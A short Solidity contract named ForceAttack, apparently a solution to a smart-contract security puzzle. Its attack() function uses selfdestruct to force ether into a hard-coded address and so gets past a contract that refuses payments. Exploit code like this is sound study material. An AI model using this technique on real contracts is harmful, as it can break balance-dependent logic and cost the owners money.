// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

contract ForceAttack {

    function attack() public payable {
        selfdestruct(payable(0xE8b5a03894bd18C16f60a46C1059FC252cEb023f));
    }
}